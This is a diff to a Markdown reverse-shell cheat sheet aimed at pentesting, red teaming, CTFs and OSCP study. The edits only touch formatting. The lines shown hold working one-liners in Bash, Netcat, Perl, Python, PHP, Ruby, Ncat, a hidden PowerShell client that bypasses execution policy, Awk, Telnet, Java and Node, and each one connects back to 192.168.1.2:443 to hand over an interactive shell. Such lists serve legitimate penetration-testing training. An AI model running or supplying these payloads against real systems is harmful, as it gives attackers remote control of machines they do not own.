@@ -6,7 +6,7 @@ __Pentesting - Red Team - CTFs - OSCP__
 
   ---
   
-  `Bash`
+ `Bash`
 
   ```cmd
   bash -i >& /dev/tcp/192.168.1.2/443 0>&1
@@ -22,7 +22,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   
   ---
   
-`Netcat`
+ `Netcat`
 
   ```cmd
   nc -e /bin/sh 192.168.1.2 443
@@ -122,14 +122,14 @@ __Pentesting - Red Team - CTFs - OSCP__
   
   ---
   
-`Perl`
+ `Perl`
 
   ```cmd
   perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
   ```
  ---
  
-`Python`
+ `Python`
 
   ```cmd
    export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -140,7 +140,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
  ---
  
-`PHP`
+  `PHP`
   ```php
   php -r '$sock=fsockopen("192.168.1.2",443);`/bin/sh -i <&3 >&3 2>&3`;'
   
@@ -158,7 +158,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
-`Ruby`
+ `Ruby`
 
   ```cmd
   ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
@@ -169,21 +169,22 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
-`Xterm`
+ `Xterm`
 
-   ```cmd
-   xterm -display 192.168.1.2:443
-   ```
+  ```cmd
+  xterm -display 192.168.1.2:443
+  ```
+  
   ---
   
-`Ncat`
+ `Ncat`
 
   ```cmd
   ncat 192.168.1.2 443 -e /bin/bash
   ```
   ---
   
-`Powershell`
+ `Powershell`
 
   ```powershell
   powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
@@ -194,7 +195,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
  ---
  
-`Awk`
+ `Awk`
 
   ```cmd
   awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
@@ -206,6 +207,7 @@ __Pentesting - Red Team - CTFs - OSCP__
  ```cmd
  gawk 'BEGIN {P=443;S="> ";H="192.168.1.2";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
  ```
+ 
  ---
  
  `Golang`
@@ -215,17 +217,18 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
-  `Telnet`
+ `Telnet`
 
   ```cmd
   rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 443 0/tmp/p
   ```
-  ```
+  ```cmd
   telnet 192.168.1.2 80 | /bin/bash | telnet 192.168.1.2 443
   ```
+  
   ---
   
-  `Java`
+ `Java`
 
   ```cmd
   r = Runtime.getRuntime()
@@ -234,7 +237,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
-  `Node`
+ `Node`
   
   ```cmd
   require('child_process').exec('bash -i >& /dev/tcp/192.168.1.2/443 0>&1');
